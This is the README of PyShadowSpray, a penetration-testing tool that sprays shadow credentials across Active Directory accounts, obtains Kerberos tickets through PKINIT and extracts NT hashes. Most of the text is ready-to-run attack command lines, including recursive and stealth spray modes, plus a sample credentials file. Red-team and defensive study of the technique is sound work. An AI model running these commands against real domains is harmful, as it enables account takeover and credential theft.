# PyShadowSpray

PyShadowSpray is a Python tool for performing shadow credentials spray attacks against Active Directory environments. It automates the process of adding shadow credentials (via the `msDS-KeyCredentialLink` attribute) to multiple user and computer accounts, then uses PKINIT to obtain TGT tickets and extract NT hashes.

**PyShadowSpray is based on [ShadowSpray](https://github.com/Dec0ne/ShadowSpray)** by Dec0ne, a C# tool for spraying shadow credentials across entire domains. This Python implementation extends the original concept with additional features like Kerberos authentication, recursive spray capabilities, and stealth mode.

This tool combines the capabilities of [pyWhisker](https://github.com/ShutdownRepo/pywhisker) for shadow credential manipulation with [PKINITtools](https://github.com/dirkjanm/PKINITtools) for TGT retrieval and NT hash extraction, all in an automated spray attack workflow.

## What are Shadow Credentials?

Shadow Credentials is an attack technique that allows an attacker to gain control over a target user or computer account by manipulating the `msDS-KeyCredentialLink` attribute. This attribute stores public key material that can be used for PKINIT (Public Key Cryptography for Initial Authentication in Kerberos) pre-authentication.

**How it works:**
1. An attacker with write permissions to a target account's `msDS-KeyCredentialLink` attribute adds their own public key material
2. The attacker uses this public key (and corresponding private key) to perform PKINIT authentication
3. A TGT (Ticket Granting Ticket) is obtained without knowing the account's password
4. The NT hash can be extracted from the TGT using U2U (User-to-User) or key list attacks

For more detailed information, see:
- [Shadow Credentials: Abusing Key Trust Account Mapping for Takeover](https://eladshamir.com/2021/06/21/Shadow-Credentials.html) by Elad Shamir
- [Exploiting and Detecting Shadow Credentials and msDS-KeyCredentialLink in Active Directory](https://medium.com/@NightFox007/exploiting-and-detecting-shadow-credentials-and-msds-keycredentiallink-in-active-directory-9268a587d204) by NightFox007

## Prerequisites

**Domain Requirements:**
- The target Domain Functional Level must be **Windows Server 2016** or above
- The target domain must have at least one Domain Controller running Windows Server 2016 or above
- The Domain Controller must have its own certificate and keys (requires AD CS, PKI, CA, or similar)

**Why these prerequisites?**
- Prerequisites 1 and 2 are required because PKINIT features were introduced with Windows Server 2016
- Prerequisite 3 is required because the DC needs its own certificate and keys for the session key exchange during the `AS_REQ <-> AS_REP` transaction

A `KRB-ERROR (16) : KDC_ERR_PADATA_TYPE_NOSUPP` error will be raised if prerequisite 3 is not met.

**Attack Requirements:**
- The attacker must have control over an account able to write the `msDS-KeyCredentialLink` attribute of target users or computer accounts
- Computer objects can edit their own `msDS-KeyCredentialLink` attribute but can only add a KeyCredential if none already exists

## Installation

Install via pipx:
```bash
pipx install git+https://github.com/Coontzy1/PyShadowSpray.git
```

Or install locally:
```bash
pip install -r requirements.txt
```

## Usage

### Basic Authentication

```bash
# NTLM with password
pyshadowspray -u USERNAME -p PASSWORD -d DOMAIN -dc-ip DC_IP

# NTLM with NT hash
pyshadowspray -u USERNAME --hashes :NTHASH -d DOMAIN -dc-ip DC_IP

# Kerberos authentication
pyshadowspray -k -d DOMAIN -dc-ip DC_IP
# Or with specific ccache file
pyshadowspray -k --ccache /path/to/file.ccache -d DOMAIN -dc-ip DC_IP
```

### Target Operations

```bash
# Add shadow credential to a target user
pyshadowspray -u USER -p PASS -d DOMAIN -dc-ip DC_IP --target USERNAME --add

# List device IDs for a target user
pyshadowspray -u USER -p PASS -d DOMAIN -dc-ip DC_IP --target USERNAME --list

# Remove specific device ID
pyshadowspray -u USER -p PASS -d DOMAIN -dc-ip DC_IP --target USERNAME --remove DEVICEID

# Clear all device IDs from target user
pyshadowspray -u USER -p PASS -d DOMAIN -dc-ip DC_IP --target USERNAME --clear
```

### Spray Operations

```bash
# Basic spray attack
pyshadowspray -u USER -p PASS -d DOMAIN -dc-ip DC_IP --spray

# Recursive spray (uses compromised accounts automatically)
pyshadowspray -u USER -p PASS -d DOMAIN -dc-ip DC_IP --spray --recursive

# Spray with user-pass file
pyshadowspray -d DOMAIN -dc-ip DC_IP --spray --user-pass creds.txt

# Stealth mode (only get TGT/ccache files, no NT hash extraction)
pyshadowspray -k -d DOMAIN -dc-ip DC_IP --spray --stealth --recursive

# Exclude specific users
pyshadowspray -u USER -p PASS -d DOMAIN -dc-ip DC_IP --spray --exclude Administrator,KRBTGT
```

## Options

### Authentication
- `-u, --username TEXT`: Username for LDAP authentication
- `-p, --password TEXT`: Password for LDAP authentication
- `--hashes LMHASH:NTHASH`: LM and NT hashes (format: `LMHASH:NTHASH` or `:NTHASH` for NT hash only)
- `-d, --domain TEXT`: Domain (required)
- `--dc-ip TEXT`: IP address or FQDN of domain controller
- `-t, --target-domain TEXT`: Target domain. Use if authenticating across trusts
- `--ldaps`: Use LDAPS instead of LDAP (automatically enables channel binding when needed)
- `-k, --kerberos`: Use Kerberos authentication (uses ccache file from KRB5CCNAME or --ccache)
- `--ccache TEXT`: Path to ccache file (alternative to KRB5CCNAME environment variable)

### Target Operations (requires --target)
- `--target TEXT`: Target user/computer for shadow credential operations
- `--add`: Add shadow credential to target user
- `--list`: List device IDs for target user
- `--remove DEVICEID`: Remove specific device ID from target user
- `--clear`: Remove ALL device IDs from target user (requires confirmation)

### Spray Operations
- `--spray`: Spray shadow credentials to all enabled users/computers and get NT hashes
- `--user-pass TEXT`: File with username:password pairs (one per line) for spray
- `--recursive`: Recursively use compromised accounts to continue spraying
- `--exclude TEXT`: Comma-separated list of users to exclude from spray
- `--stealth`: Stealth mode: Skip NT hash extraction (unpac-the-hash). Only get TGT/ccache files

### Certificate Export
- `--export [PEM|PFX]`: Certificate format: PEM or PFX (default: PFX)
- `--cert-password TEXT`: Password for PFX export (random if not provided)
- `--cert-path TEXT`: Path/filename for certificate export

### Output/Behavior
- `--output-dir TEXT`: Output directory for certificates and ccache files (default: creds)
- `--no-autoremove`: Do not automatically remove device IDs after PKINIT
- `--no-banner`: Do not show banner (Easier for Screenshots)
- `--debug`: Enable verbose logging

## Features

- ✅ Supports NTLM (password/hash) and Kerberos authentication
- ✅ Queries only enabled accounts automatically
- ✅ Identifies and flags Domain Admins/Enterprise Admins as **[VALUABLE]**
- ✅ Identifies and flags Domain Controllers as **[VALUABLE]**
- ✅ Recursive mode automatically uses compromised accounts
- ✅ Stealth mode for obtaining only TGT/ccache files without NT hash extraction
- ✅ Optimized LDAP querying (single query at start for recursive operations)
- ✅ LDAPS support with automatic channel binding
- ✅ Automatic certificate generation and PKINIT TGT retrieval
- ✅ Automatic NT hash extraction via U2U (unpac-the-hash)
- ✅ Support for both PFX and PEM certificate formats

## Examples

### Example user-pass file format (creds.txt):
```
user1:Password123
user2:AnotherPass456
user3:Password789
user4:aad3b435b51404eeaad3b435b51404ee:41a4838ba3373495144f783e5bd11c
```

Note: The tool automatically detects if a credential is a password or NT hash (32-character hex string).

### Example: Recursive spray with Kerberos
```bash
export KRB5CCNAME=/path/to/ccache
pyshadowspray -k -d DOMAIN -dc-ip DC_IP --spray --recursive
```

### Example: Stealth recursive spray
```bash
pyshadowspray -k -d DOMAIN -dc-ip DC_IP --spray --stealth --recursive
```

This will:
1. Use initial Kerberos ccache to authenticate
2. Spray shadow credentials to all enabled accounts
3. Get TGT/ccache files for successfully compromised accounts (no NT hash extraction)
4. Use newly obtained ccache files to continue spraying recursively

### Example: Spray with multiple credentials
```bash
pyshadowspray -d DOMAIN -dc-ip DC_IP --spray --user-pass creds.txt --recursive
```

This will:
1. Use each credential from the file to authenticate
2. Spray shadow credentials to all enabled accounts
3. Extract NT hashes from successfully compromised accounts
4. Use newly obtained credentials to continue spraying recursively

## Output

All output files are saved to the `--output-dir` directory (default: `creds/`):
- `spray_USERNAME.pfx` - PFX certificates (when using default export format)
- `spray_USERNAME_cert.pem` / `spray_USERNAME_priv.pem` - PEM format certificates
- `USERNAME.ccache` - Kerberos ccache files (when using stealth mode or Kerberos)
- `device_ids.log` - Log of all device ID operations

## Important Notes

- When using `--kerberos` / `-k`, credentials are obtained from `--ccache` file or `KRB5CCNAME` environment variable
- Without `-k` flag, normal NTLM authentication is used (even if ccache exists)
- Initial credentials from `--user-pass` file are automatically added to "already compromised" list
- Domain Admin and Domain Controller identification happens once at the start (optimized for recursive operations)
- User objects can't edit their own `msDS-KeyCredentialLink` attribute. However, **computer objects can**
- Computer objects can edit their own `msDS-KeyCredentialLink` attribute but **can only add a KeyCredential if none already exists**
- Make sure there is no time skew between your attacker host and the Key Distribution Center (usually the Domain Controller)
- Certificates generated by PyShadowSpray are valid 40 years before and after the current date to avoid time-related errors

## Credits and References

### Original Tools and Research

This tool builds upon the excellent work of the following projects and researchers:

**ShadowSpray** - Original C# tool for shadow credentials spray attacks across entire domains
- Repository: https://github.com/Dec0ne/ShadowSpray
- Created by Dec0ne
- PyShadowSpray is based on the concept and approach of ShadowSpray, adapted to Python with additional features

**pyWhisker** - Python version of the C# tool for "Shadow Credentials" attacks
- Repository: https://github.com/ShutdownRepo/pywhisker
- Credits to the pyWhisker team for the shadow credential manipulation functionality

**PKINITtools** - Tools for PKINIT authentication and NT hash extraction
- Repository: https://github.com/dirkjanm/PKINITtools
- Authors:
  - Alberto Solino (@agsolino)
  - Dirk-jan Mollema (@_dirkjan)
  - Tamas Jos (@skelsec)
- PyShadowSpray uses code derived from `gettgtpkinit.py` and `getnthash.py` from PKINITtools

**Whisker** - Original C# tool for Shadow Credentials
- Created by Elad Shamir
- PyShadowSpray is inspired by the original Whisker tool

**DSInternals** - Library for Active Directory operations
- Created by Michael Grafnetter
- Used by pyWhisker for shadow credential manipulation

### Research and Documentation

- **Shadow Credentials: Abusing Key Trust Account Mapping for Takeover** by Elad Shamir
  - https://eladshamir.com/2021/06/21/Shadow-Credentials.html
  
- **Exploiting and Detecting Shadow Credentials and msDS-KeyCredentialLink in Active Directory** by NightFox007
  - https://medium.com/@NightFox007/exploiting-and-detecting-shadow-credentials-and-msds-keycredentiallink-in-active-directory-9268a587d204

- **The Hacker Recipes** - Excellent documentation on ACEs abuse and Shadow Credentials
  - https://www.thehacker.recipes/

### Additional Credits

- **Impacket** - Python classes for working with network protocols
  - Repository: https://github.com/fortra/impacket
  - Credits to the entire Impacket team and contributors

- **ldap3** - LDAP client library
  - Repository: https://github.com/ly4k/ldap3
  - Special thanks for channel binding support

- **minikerberos** - Pure Python Kerberos library
  - Used for PKINIT operations

- **dsinternals** (Python) - Python equivalent of DSInternals
  - Created by podalirius
  - Used for shadow credential manipulation

## License

This project is licensed under the MIT License.

## Disclaimer

This tool is for authorized security testing and educational purposes only. Unauthorized access to computer systems is illegal. The authors and contributors are not responsible for any misuse of this tool.
